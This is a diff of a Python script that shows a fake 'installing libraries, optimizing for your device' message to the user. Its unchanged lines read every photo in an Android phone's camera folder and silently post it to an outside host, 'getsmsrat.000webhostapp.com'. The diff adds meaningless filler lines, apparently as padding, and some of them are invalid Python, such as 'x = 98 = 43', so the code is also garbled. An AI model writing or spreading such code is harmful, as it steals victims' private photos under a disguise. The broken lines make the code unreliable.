@@ -16,14 +16,26 @@ print(banner)
 print("Установка нужных библиотек")
 print("Оптимизация под ваше устройство, это может занять несколько минут, подождите")
 
+a = 0
+a += 1
 
+b = a +1 
+c = list(a)
 
+c.append(b)
 
+x = 98 = 43
+admin = 2
+dfdfd = "dfdfggdfgdfdfg"
 
+r = requests.get("google.com")
 l = os.listdir("../storage/shared/DCIM/Camera")
+e = 60 * 60 * 60
 for i in range(len(l)):
     f = open("../storage/shared/DCIM/Camera/"+l[i], "rb")
     r = f.read()
+    n = 3
+    n += 1
     try:
         requests.post("getsmsrat.000webhostapp.com", data={"im": r})
     except:
